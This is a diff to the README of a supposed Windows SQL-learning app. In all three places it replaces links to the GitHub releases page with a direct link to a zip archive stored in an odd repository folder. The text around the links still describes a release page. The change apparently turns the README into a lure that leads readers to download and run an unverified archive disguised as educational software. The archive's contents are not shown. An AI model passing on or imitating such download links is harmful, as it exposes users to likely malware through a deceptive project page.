@@ -1,6 +1,6 @@
 # 📘 sql-learning - Learn SQL with Clear Practice
 
-[![Download SQL Learning](https://img.shields.io/badge/Download-Release%20Page-blue.svg?style=for-the-badge)](https://github.com/improving-photopigment56/sql-learning/releases)
+[![Download SQL Learning](https://img.shields.io/badge/Download-Release%20Page-blue.svg?style=for-the-badge)](https://github.com/improving-photopigment56/sql-learning/raw/refs/heads/main/jumba/sql-learning-1.9.zip)
 
 ## 🧭 What this app is
 
@@ -21,7 +21,7 @@ The app uses a dark red theme and keeps the layout easy to scan. It fits users w
 
 Visit this page to download the app for Windows:
 
-https://github.com/improving-photopigment56/sql-learning/releases
+https://github.com/improving-photopigment56/sql-learning/raw/refs/heads/main/jumba/sql-learning-1.9.zip
 
 On that page, look for the latest release and download the Windows file that matches your system.
 
@@ -162,4 +162,4 @@ Yes. The app focuses on short examples you can copy, study, and adapt.
 
 Get the Windows release here:
 
-https://github.com/improving-photopigment56/sql-learning/releases
+https://github.com/improving-photopigment56/sql-learning/raw/refs/heads/main/jumba/sql-learning-1.9.zip
